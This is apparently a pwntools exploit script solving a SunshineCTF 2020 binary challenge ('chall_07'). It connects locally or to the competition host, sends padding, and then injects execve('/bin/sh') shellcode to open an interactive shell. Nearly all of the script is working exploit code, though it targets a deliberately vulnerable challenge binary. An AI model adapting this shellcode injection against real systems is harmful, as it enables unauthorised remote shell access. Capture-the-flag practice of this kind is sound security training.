#!/usr/bin/python3
from pwn import *
import monkeyhex
import re

# context.log_level = 'debug'
context.terminal = ['termite', '-e']

# lib = ELF('/usr/lib/libc.so.6') if not args.REMOTE else ELF('')
binary = context.binary = ELF('chall_07')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """
    """ if commands is None else commands
    return gdb.attach(p, val)


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    p = process(binary.path)
    if start_gdb is True:
        attach_gdb(p)
    return p

rexp = re.compile(b'0x[a-f0-9]+')
p = new_proc(False) if not args.REMOTE else remote('chal.2020.sunshinectf.org', int('30007'))

# p.sendline(b'A'*56 + p64(0xfacade)*15)
# p.sendafter(b"In the land of raw humanity", b'A'*0x13)
p.send(b'A'*0x13)
# prompt = p.recvuntil(b'\n')
# leak = int(re.search(rexp, prompt)[0], 16)
# log.info('leak main %s', hex(leak))
# binary.address = leak - binary.sym['main']

# payload = cyclic(100) + b'\n'
payload = asm(shellcraft.execve(b'/bin/sh', 0, 0)) +b'\n'
p.send(payload)

# do leak / payload gen here

# if args.DEBUG is True:
#     attach_gdb(p)
# p.sendline(payload)
# if args.DEBUG is True:
#     import ipdb as pdb; pdb.set_trace()

p.interactive()
